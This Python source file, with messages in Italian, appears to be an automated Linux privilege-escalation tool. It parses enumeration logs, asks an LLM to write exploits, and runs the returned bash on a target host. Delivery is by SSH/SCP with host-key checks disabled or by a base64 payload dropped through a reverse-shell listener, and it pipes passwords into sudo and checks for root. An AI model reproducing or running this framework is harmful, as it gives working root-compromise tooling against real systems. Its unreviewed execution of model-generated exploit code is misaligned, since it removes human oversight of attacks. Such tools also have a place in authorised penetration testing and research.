import sys
import re
import argparse
import subprocess
from Linpeas_Parser import LinpeasParser
from LinEnum_Parser import LinEnumParser
from lse_parser import LseParser
from suid3num_parser import Suid3numParser
from llm_client import LLMClient
from pwn import *

def execute_automated_exploit_revshell(llm_response, shell_session):
    match = re.search(r'```bash\n(.*?)\n```', llm_response, re.DOTALL)
    if not match:
        print("[-] Nessun codice bash eseguibile trovato nella risposta.")
        return False

    bash_script_content = match.group(1).strip()
    if "NO_VULN" in bash_script_content:
        return False 
    b64_payload = base64.b64encode(bash_script_content.encode('utf-8')).decode('utf-8')
    
    print("\n--- PREPARAZIONE PAYLOAD (IN-BAND) ---")
    print(f"[*] Payload convertito in Base64 ({len(b64_payload)} caratteri).")
    
    remote_script_path = "/dev/shm/payload_pe.sh"
    delivery_cmd = f"echo '{b64_payload}' | base64 -d > {remote_script_path} && chmod +x {remote_script_path} && {remote_script_path}"
    
    print(f"[*] Invio ed esecuzione del payload sulla sessione attiva...")
    
    shell_session.clean()
    
    shell_session.sendline(delivery_cmd.encode('utf-8'))
    
    time.sleep(3)
    
    output = shell_session.recv(timeout=20).decode('utf-8', errors='ignore')
    
    if output.strip():
        print("\n[ RISULTATO TERMINALE VITTIMA (STDOUT/STDERR) ]")
        print(output.strip())
    
    print("\n[*] Controllo dei privilegi attuali...")
    shell_session.sendline(b"whoami")
    time.sleep(1)
    
    whoami_output = shell_session.recv(timeout=5).decode('utf-8', errors='ignore').strip()
    
    if "root" in whoami_output.lower():
        print(f"\n[+++] PRIVILEGE ESCALATION CONFERMATA NELLA SESSIONE! Utente: {whoami_output} [+++]")
        return True
        
    elif not whoami_output:
        print("\nLa shell non risponde (timeout).")
        print("[+] Controlla il listener manuale")
        return True  
    else:
        error_keywords = [
            "permission denied", "no such file", "invalid option", 
            "command not found", "error", "failed", "only root can", 
            "unrecognized option", "syntax error", "must be privileged",
            "not mounted", "usage:", "cannot", "invalid", "bad usage",
            "operation not permitted", "password:", "password for", "su:"
            "a terminal is required", "askpass helper","sorry, try again","do not have permission",
            "not permitted to","unauthorized"
            ]
        
        full_output = (output + "\n" + whoami_output).lower()
        
        if any(err in full_output for err in error_keywords):
            print(f"[-] Exploit fallito. L'esecuzione ha generato errori bloccanti.")
            print(f"[-] Utente rimasto: '{whoami_output}'")
            return False
        else:
            print(f"[-] Sessione primaria invariata. Utente rimasto: '{whoami_output}'")
            print("[+] Controlla il listener, è possibile che sia stata effettuata la Privilege Escalation")
            return True




import re
import subprocess

def execute_automated_exploit(llm_response, target_ip, target_user, target_pass=None, target_key=None):
    match = re.search(r'```bash\n(.*?)\n```', llm_response, re.DOTALL)
    if not match:
        print("[-] Nessun codice bash eseguibile trovato nella risposta.")
        return False

    bash_script_content = match.group(1).strip()
    if "NO_VULN" in bash_script_content:
        return False 

    if target_pass and "sudo " in bash_script_content:
        bash_script_content = re.sub(
            r'(^|\n)sudo ', 
            rf"\1echo '{target_pass}' | sudo -S ", 
            bash_script_content
        )
    elif target_key and not target_pass and "sudo " in bash_script_content:
        bash_script_content = re.sub(
            r'(^|\n)sudo ', 
            rf"\1sudo -n ", 
            bash_script_content
        )

    print("\n--- PREPARAZIONE PAYLOAD ---")
    
    local_script_path = "payload.sh"
    remote_script_path = "/tmp/payload.sh"
    
    try:
        with open(local_script_path, "w", newline='\n') as f:
            f.write(bash_script_content)
        print("[+] Script payload.sh generato localmente (formato Unix).")
    except Exception as e:
        print(f"[!] Errore nella creazione del file locale: {e}")
        return False

    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa"
    
    if target_key:
        scp_base = f"scp -i {target_key} -O {ssh_opts}"
        ssh_base = f"ssh -i {target_key} {ssh_opts}"
    elif target_pass:
        scp_base = f"sshpass -p '{target_pass}' scp -O {ssh_opts}"
        ssh_base = f"sshpass -p '{target_pass}' ssh {ssh_opts}"
    else:
        print("[-] Errore: Nessuna credenziale (password o chiave) fornita per l'esecuzione.")
        return False

    print(f"[*] Trasferimento {local_script_path} sulla vittima in {remote_script_path}...")
    scp_cmd = f"{scp_base} {local_script_path} {target_user}@{target_ip}:{remote_script_path}"   

    try:
        subprocess.run(scp_cmd, shell=True, check=True, capture_output=True, text=True, timeout=60)
        print("[+] Trasferimento SCP completato.")

    except subprocess.TimeoutExpired as e:
        print(f"[!] Errore: SCP andato in timeout dopo 60 secondi.")
        print(f"    Controlla la connessione VPN verso {target_ip} o eventuali firewall.")
        if e.stderr:
            print(f"    Log SCP: {e.stderr.strip()}")
        return False

    except subprocess.CalledProcessError as e:
        print(f"[!] Errore di connessione o trasferimento (Codice: {e.returncode}).")
        print(f"    Dettaglio errore: {e.stderr.strip()}")
        return False

    except Exception as e:
        print(f"[!] Errore imprevisto di sistema: {e}")
        return False

    print("[*] Esecuzione payload in corso... (potrebbe richiedere fino a 15s per compilare ed eseguire)")
    
    ssh_cmd = f"{ssh_base} {target_user}@{target_ip} 'chmod +x {remote_script_path} && {remote_script_path} ; echo \"\n--- STATUS ---\" ; whoami'"
    
    try:
        result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        print("\n[ RISULTATO TERMINALE VITTIMA (STDOUT) ]")
        print(result.stdout)
        
        if result.stderr:
            print("\n[ ERRORI TERMINALE VITTIMA (STDERR) ]")
            print(result.stderr)
            
        if "--- STATUS ---" in result.stdout:
            output_parts = result.stdout.split("--- STATUS ---")
            script_output = output_parts[0]
            final_user = output_parts[-1].strip().lower()
            
            is_rev_shell = any(x in bash_script_content.lower() for x in ["/dev/tcp/", "nc ", "python", "perl", "bash -i"])
            
            if any(line.strip() == "root" for line in script_output.splitlines()) or "root" in final_user:
                print("\n[+++] PRIVILEGE ESCALATION CONFERMATA (Esecuzione Diretta)! [+++]")
                return True
            
            elif is_rev_shell:
                error_keywords = [
                "permission denied", "no such file", "invalid option", 
                "command not found", "error", "failed", "only root can", 
                "unrecognized option", "syntax error", "must be privileged",
                "not mounted", "usage:", "cannot", "invalid", "bad usage",
                "operation not permitted", "password:", "password for", "su:"
                "a terminal is required", "askpass helper","sorry, try again","do not have permission",
                "not permitted to","unauthorized", "sudo: a password is required"
                ]
                
                if result.stderr and any(err in result.stderr.lower() for err in error_keywords):
                    print("[-] Exploit fallito. L'esecuzione ha generato errori visibili nello STDERR.")
                    return False
                else:
                    print("\n[?] Il payload Reverse Shell è stato eseguito senza errori bloccanti.")
                    print("[+] Controlla il listener, è possibile che sia stata effettuata la Privilege Escalation")
                    return True 
                    
            else:
                print(f"[-] Exploit fallito. Nessuna shell rilevata e utente rimasto: '{final_user}'.")
                return False
                
    except subprocess.TimeoutExpired:
        if any(x in bash_script_content.lower() for x in ["/dev/tcp/", "nc ", "python", "perl", "bash -i"]):
            print("\n[!] Timeout SSH durante l'invio della Reverse Shell (Comportamento Atteso).")
            print("[+++] PRIVILEGE ESCALATION COMPLETATA! Controlla il listener. [+++]")
            return True
        else:
            print("[!] SSH in timeout. Il sistema potrebbe essere freezato, verifica manualmente.")
            return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("log_file")
    parser.add_argument("--tool", choices=['linpeas','linenum','lse','suid3num'], required=True)
    parser.add_argument("--mode", choices=['ssh', 'revshell'], required=True)
    parser.add_argument("--ip")
    parser.add_argument("--user")
    parser.add_argument("--password")
    parser.add_argument("--key")
    parser.add_argument("--lport", type=int)

    args = parser.parse_args()

    if args.mode == 'ssh':
        if not all([args.ip, args.user]):
            print("Errore: La modalità 'ssh' richiede l'uso di --ip, --user")
            sys.exit(1)
        if not args.password and not args.key:
            print("Errore: La modalità ssh richiede l'uso di --password oppure --key.")
            sys.exit(1)
    if args.mode == 'revshell' and not args.lport:
        print("Errore: La modalità 'revshell' richiede l'uso di --lport.")
        sys.exit(1)
    

    print("AUTOMATIZZAZIONE PRIVILEGE ESCALATION")
    print(f"[*] Modalità Operativa: {args.mode.upper()}")
    if args.mode == 'ssh':
        auth_method = "Password" if args.password else f"Chiave RSA ({args.key})"
        print(f"[*] Target: {args.ip} | User: {args.user}")
    print("---------\n")
    
    print("Inizializzazione Parser e LLM")
    if args.tool == "linpeas":
        parser = LinpeasParser()
    elif args.tool == "linenum":
        parser = LinEnumParser()
    elif args.tool == "lse":
        parser = LseParser()
    elif args.tool == "suid3num":
        parser = Suid3numParser()
    else:
        sys.exit(1)
    
    ai_client = LLMClient()

    shell_session = None
    if args.mode == 'revshell':
        print(f"[*] In attesa di una reverse shell in ingresso sulla porta {args.lport}...")
        context.log_level = 'error' 
        shell_session = listen(args.lport).wait_for_connection()
        print(f"[+] Connessione stabilita con {shell_session.rhost}!")

    print(f"Lettura e analisi del file di log: {args.log_file}...")
    vulnerabilities = parser.parse_file(args.log_file)
    
    if not vulnerabilities:
        print("[-] Nessuna vulnerabilità trovata nel file di log. Uscita.")
        if shell_session: shell_session.close()
        sys.exit(0)
        
    print(f"[+] Trovati {len(vulnerabilities)} potenziali vettori d'attacco.\n")

    success = False 

    i = 0 
    for index, vuln in enumerate(vulnerabilities):
        if i<0:
            i += 1
            continue
        
        print(f"--- [ VETTORE #{index + 1} ] ---")
        print(f"Target: {vuln['text']}")
        
        response = ai_client.generate_exploit(vuln['text'])
        
        if "[NO_VULN]" in response:
            print("[-] L'LLM ha scartato questo vettore\n")
            continue
            
        print("\n[ANALISI LLM COMPLETA]")
        print(response)
        
        if args.mode == 'ssh':
            success = execute_automated_exploit(response, args.ip, args.user, target_pass=args.password, target_key=args.key)
        elif args.mode == 'revshell':
            success = execute_automated_exploit_revshell(response, shell_session)
        
        if success:
            print("\n[*] L'automazione ha avuto successo. Interruzione analisi dei vettori successivi.")
                
            break
        
            
        print("\n" + "="*50 + "\n")
        
    if shell_session and not success:
        shell_session.close()

if __name__ == "__main__":
    main()